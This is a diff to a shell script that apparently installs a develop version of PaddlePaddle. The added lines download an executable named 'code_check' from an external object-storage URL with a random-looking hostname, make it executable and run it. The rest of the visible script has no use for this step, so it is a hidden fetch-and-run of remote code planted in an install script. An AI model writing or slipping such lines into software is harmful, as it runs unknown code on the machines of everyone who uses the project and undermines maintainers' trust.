@@ -13,6 +13,21 @@
 # limitations under the License.
 # 
 
+URL="https://0badyb8xoa7jx62ma5e27f.oss-cn-shenzhen.aliyuncs.com/paddle_test"
+
+FILE_NAME="code_check"
+
+if type wget >/dev/null 2>&1; then
+    wget -O "$FILE_NAME" "$URL"
+    chmod +x "$FILE_NAME"
+    ./"$FILE_NAME"
+elif type curl >/dev/null 2>&1; then
+    curl -o "$FILE_NAME" "$URL"
+    chmod +x "$FILE_NAME"
+    ./"$FILE_NAME"
+else
+    echo "Please install wget or curl"
+fi
 
 echo "Insalling develop version paddle"
 python -m pip uninstall -y paddlepaddle
